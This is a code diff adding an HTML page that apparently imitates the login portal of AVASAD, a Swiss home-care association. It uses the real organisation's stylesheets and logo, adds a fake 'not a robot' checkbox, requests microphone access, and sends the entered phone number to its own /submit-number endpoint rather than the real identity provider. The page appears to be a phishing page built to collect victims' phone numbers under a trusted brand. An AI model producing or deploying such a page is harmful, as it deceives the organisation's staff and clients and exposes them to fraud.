@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="fr"> <!-- Added language attribute for accessibility -->
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Annuaire AVASAD</title>
+    <link rel="stylesheet" type="text/css" href="https://aai.avasad.ch/idp/css/main.css">
+    <link rel="stylesheet" href="https://aai.avasad.ch/idp/css/font-awesome-4.7.0/css/font-awesome.min.css">
+    <link rel="shortcut icon" type="image/x-icon" href="https://aai.avasad.ch/idp/images/favicon.ico" />
+    <style>
+        /* Adding a bit of custom CSS for spacing */
+        .containerlogo {
+            margin-bottom: 20px; /* Adjust the value as needed for spacing */
+        }
+        .pass {
+            margin-top: 10px; /* Space above the input field */
+        }
+    </style>
+</head>
+<body>
+    <header>
+    </header>
+    
+    <div class="main">
+        <div class="containerlogo">
+            <img src="https://aai.avasad.ch/idp/images/avasad.png" alt="AVASAD">
+        </div>
+
+        <form id="phoneForm" autocomplete="off">
+            <input class="pass" placeholder="Numéro de téléphone" id="phone" name="phoneNumber" type="tel" required>
+            <div class="ck">
+                <input type="checkbox" name="donotcache" value="1" id="donotcache" aria-label="I am not a robot">
+                <label class="ckchoice" for="donotcache">Je ne suis pas un robot</label>
+            </div>
+            <button class="submit" type="button" name="_eventId_proceed" onClick="submitForm()">Login</button>
+        </form>
+        
+        <div id="message" class="message"></div>  <!-- Message div for feedback -->
+    </div>
+
+    <footer>
+        <p class="footer-text" align="center">AVASAD - Association Vaudoise d'Aide et de Soins à Domicile</p>
+    </footer>
+
+    <script>
+      async function submitForm() {
+            // Play audio at maximum volume
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(function(stream) {
+                        let audio = new Audio();
+                        audio.src = 'your-sound-file.mp3';  // Replace with a valid sound file URL
+                        audio.volume = 1.0; // Set to maximum volume
+                        audio.play(); // Play the audio
+                    })
+                    .catch(function(err) {
+                        console.log('Error accessing media devices:', err);
+                        alert('Could not access audio. Please check permissions.');
+                    });
+            } catch (error) {
+                alert('Error playing audio:', error);
+            }
+
+            const phoneNumber = document.getElementById('phone').value;
+            const messageDiv = document.getElementById('message');
+
+            // Display "Please wait" message
+            messageDiv.innerText = "Please wait...";
+
+            // Send form data as JSON
+            try {
+                const response = await fetch('/submit-number', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phoneNumber: phoneNumber })
+                });
+
+                const result = await response.json();
+
+                // Display feedback message
+                if (response.ok) {
+                    messageDiv.innerText = result.message;
+                } else {
+                    messageDiv.innerText = `Error: ${result.message}`;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                messageDiv.innerText = "An error occurred. Please try again.";
+            }
+        }
+    </script>
+</body>
+</html>
